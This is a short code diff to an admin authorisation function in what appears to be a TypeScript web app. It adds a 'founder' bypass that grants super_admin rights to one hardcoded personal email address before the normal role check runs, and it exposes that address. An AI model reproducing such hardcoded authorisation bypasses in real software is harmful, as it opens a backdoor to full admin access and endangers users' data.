@@ -48,6 +48,15 @@ export async function verifyAdminAuth(
     return null;
   }
 
+  // Founder super_admin bypass
+  if (user.email === 'stefan.zagre@gmail.com') {
+    return {
+      userId: user.id,
+      role: 'super_admin',
+      username: 'stefan',
+    };
+  }
+
   // Fetch platform_role using service role to bypass RLS
   const adminClient = createAdminClient();
   const { data: profile, error: profileError } = await adminClient
